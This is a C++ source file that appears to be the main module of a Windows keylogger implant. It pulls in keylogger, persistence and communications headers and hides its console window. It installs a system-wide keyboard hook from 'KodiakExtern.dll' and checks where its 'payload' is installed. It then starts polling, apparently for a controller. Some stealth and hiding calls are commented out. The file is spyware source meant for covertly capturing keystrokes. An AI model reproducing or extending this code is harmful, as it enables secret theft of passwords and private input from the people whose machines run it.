#include "globals.hpp"
#include "keylogger.hpp"
#include "persistence.hpp"
#include "communications.hpp"

void Stealth()
{
	AllocConsole();
	HWND__ * const stealth = FindWindowA("ConsoleWindowClass", nullptr);
	ShowWindow(stealth, false);
}

HHOOK SetKeyBoardHook()
{
	static HINSTANCE hhook_dll = LoadLibrary(TEXT("KodiakExtern.dll"));
	if (hhook_dll == nullptr)
	{
		printf("failed to hook keyboard: %lu\n", GetLastError());
	}
	auto hookproc = HOOKPROC(GetProcAddress(hhook_dll, "KeyboardProc"));
	if (hookproc == nullptr)
	{
		printf("failed to hook keyboard: %lu\n", GetLastError());
	}
	static HHOOK hhook = SetWindowsHookEx(WH_KEYBOARD, hookproc, hhook_dll, 0);
	if (hhook == nullptr)
	{
		printf("failed to hook keyboard: %lu\n", GetLastError());
	}
	return hhook;
}


#ifndef _DEBUG
int WINAPI WinMain( _In_ HINSTANCE hInstance,
				    _In_opt_ HINSTANCE hPrevInstance,
				    _In_ LPSTR lpCmdLine,
				    _In_ int nShowCmd)
#else
int main()
#endif
{
	//const auto hhook = SetKeyBoardHook();
	startTime = std::chrono::steady_clock::now();

	//Stealth();

	//pre communication install correctness checks
	const auto installPath = GetInstallPath();
	if (installPath == expectedInstallPath)
	{
	printf("Payload at correct location\n");
	}
	else printf("Payload not installed at specified location\n\texpected %ls\n\tgot      %ls\n", expectedInstallPath.data(), installPath.data());
#ifndef _DEBUG
	//HidePayload(installPath);
#endif

	StartPolling();
	//UnhookWindowsHookEx(hhook);
	return 0;	
}
